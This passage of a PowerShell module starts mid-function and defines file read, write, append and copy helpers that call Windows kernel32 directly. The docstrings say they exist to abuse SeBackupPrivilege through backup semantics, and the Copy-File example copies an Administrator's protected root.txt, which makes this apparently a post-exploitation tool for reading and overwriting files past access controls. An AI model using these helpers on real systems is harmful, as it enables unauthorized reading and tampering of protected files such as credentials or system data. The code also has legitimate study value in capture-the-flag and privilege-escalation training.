
                    $Content = $Buffer
                } else {

                    $Content = [System.Text.Encoding]::UTF8.GetString($buffer)
                }
            } else {

                Write-Verbose "[Read-FileContent] Failed with error $(([System.ComponentModel.Win32Exception] $LastError).Message)"
                $Content = $false.ToString()
            }
        } else {
            
            Write-Verbose "[Read-FileContent] $Path might not exists"
            $Content = $false.ToString()
        }
    }
    
    END {
        
        return $Content
    }
}

function Set-FileContent {

<#

    .SYNOPSIS

        This function use WinAPI to set content of a file

    .DESCRIPTION

        It will first get the full path of the file, get handle for it, and finally it will use WriteFile. Thanks to it, you can use
        access token for writing file, especially SeBackupPrivilege if enabled 

    .PARAMETER Path

        Path of the file to write on

    .PARAMETER Content

        A string representing the content to write

    .PARAMETER RawBuffer

        A byte array representing the content to write (for binary)

    .PARAMETER OverWrite

        OverWrite the file if needed

    .PARAMETER Backup

        Will use backup mode

    .EXAMPLE

        Set-FileContent -Path .\hello.txt -Content "hello"

#>

    [OutputType([bool])]
    [CmdletBinding(DefaultParameterSetName="String")]

    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(ParameterSetName="String", Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Content,

        [Parameter(ParameterSetName="Raw", Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Buffer")]
        [Byte[]]
        $RawBuffer,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Force")]
        [Switch]
        $OverWrite,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [Switch]
        $Backup
    )
    
    PROCESS {
        
        if ((-not (Test-Path $Path)) -or ((Test-Path $Path) -and $OverWrite.IsPresent)) {

            if (-not (Test-Path $Path)) {

                Write-Verbose "[Set-FileContent] Creating $Path"
                $null = New-Item -ItemType File -Path $Path
            }

            $Path = (Get-ItemProperty $Path).VersionInfo.FileName

            Write-Verbose "[Set-FileContent] Getting file handle"
            
            if ($Backup.IsPresent) {$FileAttribute = $FILE_FLAGS_AND_ATTRIBUTES::FILE_FLAG_BACKUP_SEMANTICS} else {$FileAttribute = $FILE_FLAGS_AND_ATTRIBUTES::NORMAL}
            $hFile = $kernel32::CreateFile($Path, $FILE_ACCESS::GENERIC_WRITE, $FILE_SHARE::NONE, [IntPtr]::Zero, $CREATION_DISPOSITION::CREATE_ALWAYS, $FileAttribute, [IntPtr]::Zero)

            if ($RawBuffer) {

                $buffer = $RawBuffer
            } else {

                $buffer = [System.Text.Encoding]::UTF8.GetBytes($Content)
            }

            $BytesWritten = [UInt32]::MinValue

            Write-Verbose "[Set-FileContent] Writing file"

            $ReturnValue = $kernel32::WriteFile($hFile, $buffer, $buffer.Length, [ref]$BytesWritten, [IntPtr]::Zero); $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $null = $kernel32::CloseHandle($hFile)

            if (-not $ReturnValue) {

                Write-Verbose "[Set-FileContent] Failed with error $(([System.ComponentModel.Win32Exception] $LastError).Message)"
            }
        } else {

            Write-Verbose "[Set-FileContent] File already exists, use -OverWrite/-Force to overwrite"
            $ReturnValue = $false
        }
    }
    
    END {
        
        return $ReturnValue
    }
}

function Add-FileContent {

<#

    .SYNOPSIS

        This function use WinAPI to add content to a file

    .DESCRIPTION

        It will first get the full path of the file, get handle for it, and finally it will use WriteFile. Thanks to it, you can use
        access token for writing file, especially SeBackupPrivilege if enabled 

    .PARAMETER Path

        Path of the file to write on

    .PARAMETER Content

        A string representing the content to write

    .PARAMETER RawBuffer

        A byte array representing the content to write (for binary)

    .PARAMETER Backup

        Will use backup mode

    .EXAMPLE

        Add-FileContent -Path .\hello.txt -Content "hello"

#>

    [OutputType([bool])]
    [CmdletBinding()]
    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(ParameterSetName="String", Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Content,

        [Parameter(ParameterSetName="Raw", Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Buffer")]
        [Byte[]]
        $RawBuffer,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Force")]
        [Switch]
        $OverWrite,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [Switch]
        $Backup
    )

    BEGIN {

        $arguments = @{}

        $arguments["Path"] = $Path
        $arguments["RawBuffer"] = $true

        if ($Backup.IsPresent) {$arguments["Backup"] = $true}
    }
    
    PROCESS {
        
        if (Test-Path $Path) {

            $Path = (Get-ItemProperty $Path).VersionInfo.FileName

            $Buffer = Read-FileContent @arguments

            if ($PSBoundParameters["Content"]) {

                $Buffer += [System.Text.Encoding]::UTF8.GetBytes($Content)
            } else {

                $Buffer += $RawBuffer
            }
            
            Write-Verbose "[Add-FileContent] Getting file handle"

            if ($Backup.IsPresent) {$FileAttribute = $FILE_FLAGS_AND_ATTRIBUTES::FILE_FLAG_BACKUP_SEMANTICS} else {$FileAttribute = $FILE_FLAGS_AND_ATTRIBUTES::NORMAL}
            $hFile = $kernel32::CreateFile($Path, $FILE_ACCESS::GENERIC_WRITE, $FILE_SHARE::NONE, [IntPtr]::Zero, $CREATION_DISPOSITION::CREATE_ALWAYS, $FileAttribute, [IntPtr]::Zero)

            $BytesWritten = [UInt32]::MinValue

            Write-Verbose "[Add-FileContent] Writing file"

            $ReturnValue = $kernel32::WriteFile($hFile, $Buffer, $Buffer.Length, [ref]$BytesWritten, [IntPtr]::Zero); $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $null = $kernel32::CloseHandle($hFile)

            if (-not $ReturnValue) {

                Write-Verbose "[Add-FileContent] Failed with error $(([System.ComponentModel.Win32Exception] $LastError).Message)"
            }
        } else {

            Write-Verbose "[Add-FileContent] $Path might not exists"
            $ReturnValue = $false
        }
    }
    
    end {
        
        return $ReturnValue
    }
}

function Copy-File {

<#

    .SYNOPSIS

        This function copy a file using WinAPI

    .DESCRIPTION

        This function is simply the combination of Read-FileContent and Set-FileContent

    .PARAMETER Path

        File to copy

    .PARAMETER Destination

        File to paste

    .PARAMETER OverWrite

        OverWrite the file if needed

    .PARAMETER Backup

        Will use backup mode

    .EXAMPLE

        Copy-File -Backup -Path C:\Users\Administrator\Desktop\root.txt -Destination .\root.txt ;)

#>

    [OutputType([bool])]
    [CmdletBinding()]

    param (
        
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Destination,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Force")]
        [Switch]
        $OverWrite,

        [Parameter(Mandatory=$false, Position=3,  ValueFromPipeline=$true)]
        [Switch]
        $Backup
    )
    
    PROCESS {
        
        if (Test-Path $Path) {

            $arguments = @{}
            $arguments["Path"] = $Path
            if ($Backup.IsPresent) {$arguments["Backup"] = $true}

            $Content = Read-FileContent @arguments -RawBuffer

            $arguments["Path"] = $Destination
            $arguments["RawBuffer"] = $Content

            if ($OverWrite.IsPresent) {$arguments["OverWrite"] = $true}

            $returnValue = Set-FileContent @arguments
        } else {

            Write-Verbose "[Copy-File] $Path might not exists"
            $ReturnValue = $false
        }
    }
    
    END {
        
        return $ReturnValue
    }
}